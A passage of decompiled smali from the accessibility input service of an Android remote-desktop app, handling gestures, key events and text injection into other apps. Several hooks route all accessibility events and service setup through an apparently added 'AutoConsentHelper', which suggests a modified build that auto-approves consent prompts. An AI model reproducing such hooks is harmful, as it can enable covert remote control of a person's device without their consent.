    const-string v3, "next(...)"

    invoke-static {v2, v3}, Ln7/j;->d(Ljava/lang/Object;Ljava/lang/String;)V

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {p0, v0, v2}, Lcom/carriez/flutter_hbb/InputService;->u(Ljava/util/LinkedList;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto :goto_b4

    :cond_c9
    return-object v0
.end method

.method public final E(II)V
    .registers 6

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_c

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    invoke-virtual {v0}, Landroid/graphics/Path;->reset()V

    goto :goto_13

    :cond_c
    new-instance v0, Landroid/graphics/Path;

    invoke-direct {v0}, Landroid/graphics/Path;-><init>()V

    iput-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    :goto_13
    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    int-to-float v1, p1

    int-to-float v2, p2

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Path;->moveTo(FF)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lcom/carriez/flutter_hbb/InputService;->l:J

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->v:I

    iput p2, p0, Lcom/carriez/flutter_hbb/InputService;->w:I

    return-void
.end method

.method public final F(Landroid/view/KeyEvent;)Z
    .registers 4

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getKeyCode()I

    move-result v0

    const/16 v1, 0x1a

    if-ne v0, v1, :cond_14

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    move-result p1

    const/4 v0, 0x1

    if-ne p1, v0, :cond_13

    const/4 p1, 0x6

    invoke-virtual {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :cond_13
    return v0

    :cond_14
    const/4 p1, 0x0

    return p1
.end method

.method public final G(Landroid/view/KeyEvent;)Z
    .registers 6

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getKeyCode()I

    move-result v0

    const/16 v1, 0x18

    const/4 v2, 0x0

    const/4 v3, 0x1

    if-eq v0, v1, :cond_30

    const/16 v1, 0x19

    if-eq v0, v1, :cond_22

    const/16 v1, 0xa4

    if-eq v0, v1, :cond_14

    const/4 p1, 0x0

    return p1

    :cond_14
    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    move-result p1

    if-nez p1, :cond_21

    invoke-virtual {p0}, Lcom/carriez/flutter_hbb/InputService;->t()Le4/d0;

    move-result-object p1

    invoke-virtual {p1, v3, v3}, Le4/d0;->g(ZI)V

    :cond_21
    return v3

    :cond_22
    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    move-result p1

    if-nez p1, :cond_2f

    invoke-virtual {p0}, Lcom/carriez/flutter_hbb/InputService;->t()Le4/d0;

    move-result-object p1

    invoke-virtual {p1, v2, v3, v3}, Le4/d0;->c(Ljava/lang/Double;ZI)V

    :cond_2f
    return v3

    :cond_30
    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    move-result p1

    if-nez p1, :cond_3d

    invoke-virtual {p0}, Lcom/carriez/flutter_hbb/InputService;->t()Le4/d0;

    move-result-object p1

    invoke-virtual {p1, v2, v3, v3}, Le4/d0;->d(Ljava/lang/Double;ZI)V

    :cond_3d
    return v3
.end method

.method public final H(Landroid/view/KeyEvent;Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    .registers 13

    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    const/4 v1, 0x0

    if-eqz v0, :cond_b

    invoke-virtual {v0, v1, v1}, Landroid/widget/EditText;->setSelection(II)V

    :cond_b
    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    const/4 v2, 0x0

    if-eqz v0, :cond_13

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_13
    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1a

    if-lt v3, v4, :cond_22

    invoke-static {p2}, Le4/l;->a(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v3

    goto :goto_23

    :cond_22
    const/4 v3, 0x0

    :goto_23
    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getTextSelectionStart()I

    move-result v4

    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getTextSelectionEnd()I

    move-result v5

    if-eqz v0, :cond_44

    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    move-result v6

    if-le v4, v6, :cond_37

    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    move-result v4

    :cond_37
    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    move-result v6

    if-le v5, v6, :cond_41

    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    move-result v5

    :cond_41
    if-le v4, v5, :cond_44

    move v4, v5

    :cond_44
    iget-object v6, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "existing text:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v8, " textToCommit:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, " textSelectionStart:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v8, " textSelectionEnd:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v6, -0x1

    if-eqz p3, :cond_a6

    if-eq v4, v6, :cond_99

    if-ne v5, v6, :cond_7a

    goto :goto_99

    :cond_7a
    if-eqz v0, :cond_13a

    iget-object p1, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz p1, :cond_83

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_83
    iget-object p1, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz p1, :cond_8a

    invoke-virtual {p1, v4, v5}, Landroid/widget/EditText;->setSelection(II)V

    :cond_8a
    iget-object p1, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz p1, :cond_136

    invoke-virtual {p1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object p1

    if-eqz p1, :cond_136

    invoke-interface {p1, v4, p3}, Landroid/text/Editable;->insert(ILjava/lang/CharSequence;)Landroid/text/Editable;

    goto/16 :goto_136

    :cond_99
    :goto_99
    iget-object p1, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz p1, :cond_a0

    invoke-virtual {p1, p3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_a0
    invoke-virtual {p0, p2}, Lcom/carriez/flutter_hbb/InputService;->J(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v1

    goto/16 :goto_13a

    :cond_a6
    iget-object p3, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz v3, :cond_b0

    if-eqz p3, :cond_b5

    invoke-virtual {p3, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_b5

    :cond_b0
    if-eqz p3, :cond_b5

    invoke-virtual {p3, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_b5
    :goto_b5
    if-eq v4, v6, :cond_de

    if-eq v5, v6, :cond_de

    iget-object p3, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "setting selection "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const/16 v1, 0x20

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object p3, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz p3, :cond_de

    invoke-virtual {p3, v4, v5}, Landroid/widget/EditText;->setSelection(II)V

    :cond_de
    iget-object p3, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz p3, :cond_136

    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    iget v1, v0, Landroid/graphics/Rect;->left:I

    iget v2, v0, Landroid/graphics/Rect;->top:I

    iget v3, v0, Landroid/graphics/Rect;->right:I

    iget v0, v0, Landroid/graphics/Rect;->bottom:I

    invoke-virtual {p3, v1, v2, v3, v0}, Landroid/view/View;->layout(IIII)V

    invoke-virtual {p3}, Landroid/widget/TextView;->onPreDraw()Z

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    move-result v0

    if-nez v0, :cond_11d

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getKeyCode()I

    move-result v0

    invoke-virtual {p3, v0, p1}, Landroid/view/View;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result p1

    iget-object p3, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "onKeyDown "

    :goto_10f
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p3, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_136

    :cond_11d
    invoke-virtual {p1}, Landroid/view/KeyEvent;->getAction()I

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_136

    invoke-virtual {p1}, Landroid/view/KeyEvent;->getKeyCode()I

    move-result v0

    invoke-virtual {p3, v0, p1}, Landroid/view/View;->onKeyUp(ILandroid/view/KeyEvent;)Z

    move-result p1

    iget-object p3, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "keyup "

    goto :goto_10f

    :cond_136
    :goto_136
    invoke-virtual {p0, p2}, Lcom/carriez/flutter_hbb/InputService;->I(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v1

    :cond_13a
    :goto_13a
    return v1
.end method

.method public final I(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .registers 7

    const-string v0, "node"

    invoke-static {p1, v0}, Ln7/j;->e(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Lcom/carriez/flutter_hbb/InputService;->J(Landroid/view/accessibility/AccessibilityNodeInfo;)Z

    move-result v0

    if-eqz v0, :cond_6d

    iget-object v1, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    const/4 v2, 0x0

    if-eqz v1, :cond_19

    invoke-virtual {v1}, Landroid/widget/TextView;->getSelectionStart()I

    move-result v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    goto :goto_1a

    :cond_19
    move-object v1, v2

    :goto_1a
    iget-object v3, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz v3, :cond_26

    invoke-virtual {v3}, Landroid/widget/TextView;->getSelectionEnd()I

    move-result v2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    :cond_26
    if-eqz v1, :cond_6d

    if-eqz v2, :cond_6d

    new-instance v0, Landroid/os/Bundle;

    invoke-direct {v0}, Landroid/os/Bundle;-><init>()V

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v3

    const-string v4, "ACTION_ARGUMENT_SELECTION_START_INT"

    invoke-virtual {v0, v4, v3}, Landroid/os/BaseBundle;->putInt(Ljava/lang/String;I)V

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v3

    const-string v4, "ACTION_ARGUMENT_SELECTION_END_INT"

    invoke-virtual {v0, v4, v3}, Landroid/os/BaseBundle;->putInt(Ljava/lang/String;I)V

    const/high16 v3, 0x20000

    invoke-virtual {p1, v3, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    move-result v0

    iget-object p1, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Update selection to "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const/16 v1, 0x20

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, " success:"

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_6d
    return v0
.end method

.method public final J(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .registers 5

    const-string v0, "node"

    invoke-static {p1, v0}, Ln7/j;->e(Ljava/lang/Object;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz v0, :cond_24

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    if-eqz v0, :cond_24

    new-instance v1, Landroid/os/Bundle;

    invoke-direct {v1}, Landroid/os/Bundle;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE"

    invoke-virtual {v1, v2, v0}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    const/high16 v0, 0x200000

    invoke-virtual {p1, v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    move-result p1

    goto :goto_25

    :cond_24
    const/4 p1, 0x0

    :goto_25
    return p1
.end method

.method public final n()V
    .registers 5

    iget-boolean v0, p0, Lcom/carriez/flutter_hbb/InputService;->s:Z

    if-eqz v0, :cond_5

    return-void

    :cond_5
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/carriez/flutter_hbb/InputService;->s:Z

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->r:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->poll()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/accessibilityservice/GestureDescription;

    if-eqz v0, :cond_28

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1, v1}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->o:Ljava/util/Timer;

    invoke-virtual {v0}, Ljava/util/Timer;->purge()I

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->o:Ljava/util/Timer;

    new-instance v1, Lcom/carriez/flutter_hbb/InputService$b;

    invoke-direct {v1, p0}, Lcom/carriez/flutter_hbb/InputService$b;-><init>(Lcom/carriez/flutter_hbb/InputService;)V

    const-wide/16 v2, 0x3c

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    return-void

    :cond_28
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/carriez/flutter_hbb/InputService;->s:Z

    return-void
.end method

.method public final o(II)V
    .registers 6

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_21

    const/4 v0, 0x1

    invoke-virtual {p0, p1, p2, v0}, Lcom/carriez/flutter_hbb/InputService;->p(IIZ)V

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    invoke-virtual {v0}, Landroid/graphics/Path;->reset()V

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    int-to-float v1, p1

    int-to-float v2, p2

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Path;->moveTo(FF)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lcom/carriez/flutter_hbb/InputService;->l:J

    iput p1, p0, Lcom/carriez/flutter_hbb/InputService;->v:I

    iput p2, p0, Lcom/carriez/flutter_hbb/InputService;->w:I

    goto :goto_28

    :cond_21
    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    int-to-float p1, p1

    int-to-float p2, p2

    invoke-virtual {v0, p1, p2}, Landroid/graphics/Path;->lineTo(FF)V

    :goto_28
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .registers 3

    invoke-static {p0, p1}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->handleAccessibilityEvent(Landroid/accessibilityservice/AccessibilityService;Landroid/view/accessibility/AccessibilityEvent;)V

    return-void
.end method

.method public onDestroy()V
    .registers 2

    const/4 v0, 0x0

    sput-object v0, Lcom/carriez/flutter_hbb/InputService;->z:Lcom/carriez/flutter_hbb/InputService;

    invoke-virtual {p0}, Lcom/carriez/flutter_hbb/InputService;->w()V

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onDestroy()V

    return-void
.end method

.method public onInterrupt()V
    .registers 1

    return-void
.end method

.method public onServiceConnected()V
    .registers 5

    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V

    sput-object p0, Lcom/carriez/flutter_hbb/InputService;->z:Lcom/carriez/flutter_hbb/InputService;
    invoke-static {p0}, Lcom/carriez/flutter_hbb/AutoConsentHelper;->setupServiceInfo(Landroid/accessibilityservice/AccessibilityService;)V

    invoke-virtual {p0}, Lcom/carriez/flutter_hbb/InputService;->w()V

    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;

    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x21

    if-lt v1, v2, :cond_17

    const v1, 0x8040

    goto :goto_19

    :cond_17
    const/16 v1, 0x40

    :goto_19
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V

    new-instance v0, Landroid/widget/EditText;

    invoke-direct {v0, p0}, Landroid/widget/EditText;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    new-instance v1, Landroid/view/ViewGroup$LayoutParams;

    const/16 v2, 0x64

    invoke-direct {v1, v2, v2}, Landroid/view/ViewGroup$LayoutParams;-><init>(II)V

    invoke-virtual {v0, v1}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz v0, :cond_36

    invoke-virtual {v0}, Landroid/widget/TextView;->onPreDraw()Z

    :cond_36
    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->u:Landroid/widget/EditText;

    if-eqz v0, :cond_3f

    invoke-virtual {v0}, Landroid/widget/TextView;->getLayout()Landroid/text/Layout;

    move-result-object v0

    goto :goto_40

    :cond_3f
    const/4 v0, 0x0

    :goto_40
    iget-object v1, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "fakeEditTextForTextStateCalculation layout:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    const-string v1, "onServiceConnected!"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public onUnbind(Landroid/content/Intent;)Z
    .registers 3

    const/4 v0, 0x0

    sput-object v0, Lcom/carriez/flutter_hbb/InputService;->z:Lcom/carriez/flutter_hbb/InputService;

    invoke-virtual {p0}, Lcom/carriez/flutter_hbb/InputService;->w()V

    invoke-super {p0, p1}, Landroid/accessibilityservice/AccessibilityService;->onUnbind(Landroid/content/Intent;)Z

    move-result p1

    return p1
.end method

.method public final p(IIZ)V
    .registers 15

    iget-object v0, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    int-to-float v1, p1

    int-to-float v2, p2

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Path;->lineTo(FF)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/carriez/flutter_hbb/InputService;->l:J

    sub-long/2addr v0, v2

    const-wide/16 v2, 0x50

    cmp-long v4, v0, v2

    if-gez v4, :cond_16

    const-wide/16 v0, 0x50

    :cond_16
    :try_start_16
    iget-object v2, p0, Lcom/carriez/flutter_hbb/InputService;->k:Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    const/16 v3, 0x1a

    const/4 v9, 0x0

    if-nez v2, :cond_3e

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v2, v3, :cond_30

    new-instance v10, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    iget-object v3, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    const-wide/16 v4, 0x0

    move-object v2, v10

    move-wide v6, v0

    move v8, p3

    invoke-direct/range {v2 .. v8}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJZ)V

    iput-object v10, p0, Lcom/carriez/flutter_hbb/InputService;->k:Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    goto :goto_61

    :cond_30
    new-instance v8, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    iget-object v3, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    const-wide/16 v4, 0x0

    move-object v2, v8

    move-wide v6, v0

    invoke-direct/range {v2 .. v7}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    :goto_3b
    iput-object v8, p0, Lcom/carriez/flutter_hbb/InputService;->k:Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    goto :goto_61

    :cond_3e
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v4, v3, :cond_53

    if-eqz v2, :cond_4f

    iget-object v3, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    const-wide/16 v4, 0x0

    move-wide v6, v0

    move v8, p3

    invoke-static/range {v2 .. v8}, Le4/k;->a(Landroid/accessibilityservice/GestureDescription$StrokeDescription;Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v2

    goto :goto_50

    :cond_4f
    move-object v2, v9

    :goto_50
    iput-object v2, p0, Lcom/carriez/flutter_hbb/InputService;->k:Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    goto :goto_61

    :cond_53
    iput-object v9, p0, Lcom/carriez/flutter_hbb/InputService;->k:Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    new-instance v8, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    iget-object v3, p0, Lcom/carriez/flutter_hbb/InputService;->j:Landroid/graphics/Path;

    const-wide/16 v4, 0x0

    move-object v2, v8

    move-wide v6, v0

    invoke-direct/range {v2 .. v7}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    goto :goto_3b

    :goto_61
    iget-object v2, p0, Lcom/carriez/flutter_hbb/InputService;->k:Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    if-eqz v2, :cond_ba

    new-instance v3, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v3}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    invoke-virtual {v3, v2}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    iget-object v2, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "doDispatchGesture x:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, " y:"

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p1, " time:"

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v2, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v3}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object p1

    invoke-virtual {p0, p1, v9, v9}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_9a
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_9a} :catch_9b

    goto :goto_ba

    :catch_9b
    move-exception p1

    iget-object p2, p0, Lcom/carriez/flutter_hbb/InputService;->h:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "doDispatchGesture, willContinue:"

